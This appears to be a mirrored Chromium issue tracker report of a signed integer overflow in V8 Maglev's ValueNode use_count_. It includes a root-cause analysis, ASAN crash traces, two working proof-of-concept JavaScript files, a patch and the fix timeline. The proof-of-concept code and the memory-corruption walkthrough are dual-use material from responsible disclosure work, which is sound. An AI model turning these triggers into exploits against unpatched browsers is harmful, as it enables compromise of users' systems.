# V8: Signed Integer Overflow in Maglev ValueNode use_count_

| Field | Value |
|-------|-------|
| **Issue ID** | [496807872](https://issues.chromium.org/issues/496807872) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ca...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2026-03-27 |
| **Bounty** | $5,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

This is a signed integer overflow vulnerability in V8's Maglev compiler. The `ValueNode::use_count_` field is a signed `int`, but when a JavaScript function has many local variables all referencing the same node, the total use count can grow as ~N^2 (N locals x ~N checkpoints), overflowing `int` for sufficiently large N. The overflowed (negative) use count causes the node to appear unused and be removed, while deoptimization frames still reference it. Subsequent compiler passes then write through a type-confused pointer derived from the removed node.

### Overview

The `ValueNode` class in Maglev uses a signed `int` for `use_count_`, tracking how many times a node is referenced. When a function has N local variables all initialized to the same value (e.g., `let v0=x, v1=x, ...` where `x` is a parameter), and the function body generates many bytecodes with deoptimization checkpoints (e.g., `return [v0, v1, ..., vN]`), each checkpoint calls `AddDeoptUse()` for all N live locals on the single shared node. The total use count reaches ~N^2, overflowing the signed `int` for sufficiently large N.

### Detail

```
// src/maglev/maglev-ir.h:2552-2556
void add_use() {
    // Make sure a saturated use count won't overflow.
    DCHECK_LT(use_count_, kMaxInt);
    use_count_++;
}

```

The `use_count_` field is defined as `int` at line 2704, and the `add_use()` method at line 2552 increments it with only a DCHECK guard (debug-only). In release builds, the increment can overflow.

The overflow is triggered through the deoptimization checkpoint mechanism:

```
// src/maglev/maglev-graph-builder.cc:1601-1630
DeoptFrame* MaglevGraphBuilder::GetLatestCheckpointedFrame() {
  // ...
  if (!latest_checkpointed_frame_) {
    // ...
    latest_checkpointed_frame_->as_interpreted().frame_state()->ForEachValue(
        *compilation_unit_,
        [&](ValueNode* node, interpreter::Register) { AddDeoptUse(node); });
    // ...
  }
  return latest_checkpointed_frame_;
}

```

At lines 1615-1617, `GetLatestCheckpointedFrame()` iterates through ALL live locals in the frame state and calls `AddDeoptUse(node)` for each one. `AddDeoptUse` ultimately calls `add_use()` on the referenced `ValueNode`.

When a function has 65540 local variables all assigned the same parameter `x`, they all reference a single `InitialValue` node. The function body's `return [v0, v1, ..., v65539]` compiles to ~65540 `StaInArrayLiteral` bytecodes, each of which creates nodes with eager deopt info (e.g., `CheckInt32Condition` for bounds checks). Each of these triggers a new checkpoint:

- 65540 locals per checkpoint \* ~65540 checkpoints ~= 4.3 billion `add_use()` calls
- `int` max = 2,147,483,647
- Overflow occurs partway through the bytecode processing

In release builds, the signed integer overflow is undefined behavior. In practice (on x86-64), `use_count_` wraps to negative values. This triggers the following chain:

1. **`is_used()` returns false**: `use_count_ > 0` (`src/maglev/maglev-ir.h:2550`) evaluates to false for negative values.
2. **`DeadNodeSweepingProcessor` removes the node**: During the `GraphMultiProcessor` pass (`src/maglev/maglev-compiler.cc:185`), constants are processed first via the graph processor (`src/maglev/maglev-graph-processor.h:119-131`), which erases removed constants from the constants map. For non-constant nodes (like `InitialValue`), `DeadNodeSweepingProcessor::Process` (`src/maglev/maglev-post-hoc-optimizations-processors.h:478-487`) returns `ProcessResult::kRemove` when `!node->is_used()`.
3. **Subsequent processors skip the removed node**: The `NodeMultiProcessor` (`src/maglev/maglev-graph-processor.h:450-467`) immediately returns `kRemove` without calling subsequent processors. This means `ValueLocationConstraintProcessor` never calls `set_regalloc_info()` (`src/maglev/maglev-pre-regalloc-codegen-processors.h:32`) on the removed node, and `LiveRangeAndNextUseProcessor` never assigns it a node ID.
4. **Type confusion via `regalloc_info_`/`owner_` union**: The `NodeBase` class stores these in a union (`src/maglev/maglev-ir.h:2280-2283`):
   
   ```
   union {
       BasicBlock* owner_ = nullptr;      // Valid in the frontend processors.
       RegallocNodeInfo* regalloc_info_;  // Valid in the backend processors.
   };
   
   ```
   
   Since `set_regalloc_info()` was never called, `regalloc_info_` still holds the `owner_` value. For `InitialValue` nodes (from function parameters), `owner_` is a valid `BasicBlock*` set via `set_owner(current_block())` during graph building (`src/maglev/maglev-reducer-inl.h:266`). For constant nodes (e.g., `Smi(0)`), `owner_` is `nullptr`.
5. **`MarkCheckpointNodes` writes through the type-confused pointer**: When `LiveRangeAndNextUseProcessor` processes a different node that has deopt info, it calls `MarkCheckpointNodes` (`src/maglev/maglev-pre-regalloc-codegen-processors.h:384`), which iterates the deopt frame's inputs. For each input node, `MarkUse` (`src/maglev/maglev-pre-regalloc-codegen-processors.h:351-355`) calls `node->regalloc_info()->record_next_use()`. On the removed node, `regalloc_info()` (`src/maglev/maglev-ir.h:2693-2696`) returns the `owner_` value reinterpreted as `RegallocValueNodeInfo*`, and `record_next_use()` (`src/maglev/maglev-regalloc-node-info.h:184-193`) writes through it:
   
   ```
   void record_next_use(NodeIdT id, InputLocation* input_location) {
       end_id_ = id;                          // Write uint32 at this+offset_A
       *last_uses_next_use_id_ = id;          // Read ptr at this+offset_B, write uint32 there
       last_uses_next_use_id_ = input_location->get_next_use_id_address();
   }
   
   ```

For constant nodes (`owner_` = `nullptr`), the write to `end_id_` targets address `0x10` (null + field offset), causing a SIGSEGV. For `InitialValue` nodes (`owner_` = valid `BasicBlock*`), the writes target fields within the `BasicBlock` struct (zone-allocated memory). ASAN confirms this with a `use-after-poison` WRITE to a real zone memory address.

When ASAN zone poisoning is disabled (`ASAN_OPTIONS=allow_user_poisoning=0`), the writes succeed, corrupting the `BasicBlock` data structures. The subsequent `StraightForwardRegisterAllocator` (`src/maglev/maglev-regalloc.cc:613`) then crashes when iterating the corrupted block, confirming the downstream impact.

### Trigger Conditions

1. Create a JavaScript function with a large number of local variables (e.g., N = 65540)
2. Initialize all locals to the same shared node (e.g., `let v0=x, v1=x, ...` for a parameter)
3. Include an expression that references all locals, generating many bytecodes with deoptimization checkpoints (e.g., `return [v0, v1, ..., vN]`)
4. Trigger Maglev compilation using `%OptimizeMaglevOnNextCall(f)` or natural tier-up
5. Total deopt uses = (number of locals) \* (number of checkpoints) > INT\_MAX

**Note**: The PoC requires O(N^2) zone memory for checkpoint frames. With N = 65540, this amounts to ~17 GB. The release ASAN build (which uses its own allocator instead of partition\_alloc) can allocate this memory. Non-ASAN builds hit partition\_alloc's allocation limits before the overflow occurs.

## Version

### Reproduced Version

- `main` branch latest commit (2026/03/27): `2566712f9aaf435a05df18e07fdbb4a074e1e21f`
- V8 14.8.0

### Bisect

The vulnerability likely originates from the initial Maglev implementation, as the `use_count_` field has always been `int` and there has never been a limit on the number of local variables that Maglev will compile.

## Reproduction Case

### Release ASAN Build

```
out/x64.release_asan/d8 --allow-natives-syntax poc.js

```

Result:

```
==2340586==ERROR: AddressSanitizer: use-after-poison on address 0x715c113a0fe8 at pc 0x5cfbf617b72b bp 0x7ffd293cb590 sp 0x7ffd293cb588
WRITE of size 4 at 0x715c113a0fe8 thread T0
    #0 in LiveRangeAndNextUseProcessor::MarkUse(...) src/maglev/maglev-regalloc-node-info.h:190:29
    #1 in VisitSingleFrame(...)  src/maglev/maglev-pre-regalloc-codegen-processors.h:395:7
    ...
    #4 in MarkCheckpointNodes(...)  src/maglev/maglev-deopt-frame-visitor.h:32:13
    ...
    #6 in GraphProcessor::ProcessGraph(...)  src/maglev/maglev-graph-processor.h:203:32
    #7 in MaglevCompiler::Compile(...)  src/maglev/maglev-compiler.cc:191:17

0x715c113a0fe8 is located 3048 bytes inside of 32768-byte region
...
SUMMARY: AddressSanitizer: use-after-poison src/maglev/maglev-regalloc-node-info.h:190:29

```

The crash at line 190 is the **second** write in `record_next_use()` (`*last_uses_next_use_id_ = id`). The **first** write at line 189 (`end_id_ = id`) writes into the `BasicBlock` struct and succeeds without ASAN detection.

With zone poisoning disabled, all writes succeed and the register allocator crashes on the corrupted data:

```
ASAN_OPTIONS=allow_user_poisoning=0 out/x64.release_asan/d8 --allow-natives-syntax poc.js

```
```
Received signal 11 SEGV_MAPERR 000000000007
    ...
    d8(StraightForwardRegisterAllocator::AllocateRegisters()+0x16c1) [src/maglev/maglev-regalloc.cc]
    d8(MaglevCompiler::Compile()+0x238a) [src/maglev/maglev-compiler.cc]

```

For comparison, `poc-const.js` (which uses `=0` instead of `=x`) crashes at address `0x10` -- this is `nullptr + field_offset`, because constant nodes have `owner_ = nullptr`:

```
out/x64.release_asan/d8 --allow-natives-syntax poc-const.js

```
```
Received signal 11 SEGV_MAPERR 000000000010
    ...
    d8(LiveRangeAndNextUseProcessor::MarkUse()+0xe0)
    ...
    d8(MaglevCompiler::Compile()+0x238a) [src/maglev/maglev-compiler.cc]

```
### Debug ASAN Build

**Warning**: This takes approximately 10-20 minutes to reproduce due to the large number of variables being processed in debug mode with ASAN instrumentation.

```
out/x64.debug_asan/d8 --allow-natives-syntax poc.js

```

Result:

```
#
# Fatal error in ../../src/maglev/maglev-ir.h, line 2554
# Debug check failed: use_count_ < kMaxInt (2147483647 vs. 2147483647).
#
#
#
#FailureMessage Object: 0x6c8e015ae860
==== C stack trace ===============================

    libv8.so(v8::internal::maglev::ValueNode::add_use()+0x8c)
    libv8.so(v8::internal::maglev::ValueNode::AddDeoptUse(...)+0xa4)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::AddDeoptUse(...)+0x46)
    ...
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::GetLatestCheckpointedFrame()+0x583)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::GetDeoptFrameForEagerDeopt()+0x15)
    libv8.so(AttachEagerDeoptInfo<CheckInt32Condition>(...)+0x3a)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::VisitStaInArrayLiteral()+0x2e8)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::VisitSingleBytecode()+0x1997)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::BuildBody()+0x3ee)
    libv8.so(v8::internal::maglev::MaglevGraphBuilder::Build()+0x76c)
    libv8.so(v8::internal::maglev::MaglevCompiler::Compile(...)+0xb5a)

```
### Non-ASAN Builds (Release and Debug)

Both the release and debug non-ASAN builds hit partition\_alloc's memory limits before the overflow occurs, because the PoC requires ~17 GB of zone memory for checkpoint frames:

```
out/x64.release/d8 --allow-natives-syntax poc.js
# Exit code: 133 (SIGTRAP) -- OOM in partition_alloc during zone expansion

out/x64.debug/d8 --allow-natives-syntax poc.js
# Exit code: 133 (SIGTRAP) -- same OOM

```

The ASAN builds succeed because ASAN replaces the allocator, bypassing partition\_alloc's limits.

### PoC Code

**poc.js** -- Parameter variant (writes to zone memory via valid `BasicBlock*`):

```
const N = 65540;  // N^2 = 4,295,225,600 > INT_MAX = 2,147,483,647
let vars = [];
for (let i = 0; i < N; i++) {
  vars.push('v' + i);
}

// All N locals alias the parameter x (InitialValue node, owner_ = first BasicBlock).
// The array literal creates N checkpoint frames, each referencing all N live locals.
// Total deopt uses for the InitialValue node: ~N x N = N^2 -> use_count_ overflow.
let code = 'function f(x) { let ' + vars.join('=x,') + '=x; return [' + vars.join(',') + ']; }';
eval(code);
%PrepareFunctionForOptimization(f);
f(0);
%OptimizeMaglevOnNextCall(f);
f(0);

```

**poc-const.js** -- Constant variant (null deref for comparison):

```
const N = 65540;
let vars = [];
for (let i = 0; i < N; i++) {
  vars.push('v' + i);
}

// Same structure but with constant 0 (Smi node, owner_ = nullptr).
// Demonstrates that the crash address changes to 0x10 (null + field offset).
let code = 'function f(x) { let ' + vars.join('=0,') + '=0; return [' + vars.join(',') + ']; }';
eval(code);
%PrepareFunctionForOptimization(f);
f(0);
%OptimizeMaglevOnNextCall(f);
f(0);

```
## Suggested Patch

*This might a bad solution for patch.*

Saturate the use count instead of allowing overflow:

```
diff --git a/src/maglev/maglev-ir.h b/src/maglev/maglev-ir.h
--- a/src/maglev/maglev-ir.h
+++ b/src/maglev/maglev-ir.h
@@ -2552,4 +2552,5 @@ class ValueNode : public Node {
   void add_use() {
     // Make sure a saturated use count won't overflow.
-    DCHECK_LT(use_count_, kMaxInt);
-    use_count_++;
+    if (V8_LIKELY(use_count_ < kMaxInt)) {
+      use_count_++;
+    }
   }

```
### Credit Information

Reporter credit: JunYoung Park(@candymate) of KAIST Hacking Lab

## Attachments

- [poc-const.js](attachments/poc-const.js) (text/javascript, 274 B)
- [poc.js](attachments/poc.js) (text/javascript, 324 B)

## Timeline

### dm...@chromium.org (2026-03-27)

Well, this [comment](https://issues.chromium.org/u/1/issues/490385906#comment4) I wrote last week aged well:

> Worth noting that Maglev shouldn't run into such issues: its use-counter is 32-bits rather than just 8, so it probably cannot reach saturation.

Let's generalize SaturatedUint8 from Turboshaft (probably with a template) and reuse it for Maglev as well then...

### ch...@google.com (2026-03-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### ml...@google.com (2026-03-31)

> Note: The PoC requires O(N^2) zone memory for checkpoint frames. With N = 65540, this amounts to ~17 GB. The release ASAN build (which uses its own allocator instead of partition\_alloc) can allocate this memory. Non-ASAN builds hit partition\_alloc's allocation limits before the overflow occurs.

I agree here and don't think this can be an issue right now in PartitionAlloc as used in Chrome. I am inclined to leave this as Vuln simply because it generally yields in a memory corruption but right now it has no user impact.

### dx...@google.com (2026-04-01)

Project: v8/v8  

Branch:  main  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7718248>

[maglev] CHECK that use\_count does not reach saturation

---


Expand for full commit details
```
     
    Fixed: 496807872 
    Change-Id: Ie764146ba1ace1da43345dcd8d9aee01fae431ef 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7718248 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106212}

```

---

Files:

- M `src/maglev/maglev-ir.h`

---

Hash: [f2133248e5feebe737417727297bffc6ca66cd47](https://chromiumdash.appspot.com/commit/f2133248e5feebe737417727297bffc6ca66cd47)  

Date: Wed Apr 1 12:02:04 2026


---

### aj...@google.com (2026-04-22)

Note: for the future, please attach a complete symbolized asan stack to reports.

### sp...@google.com (2026-04-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline, bisect not applicable. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/496807872)*
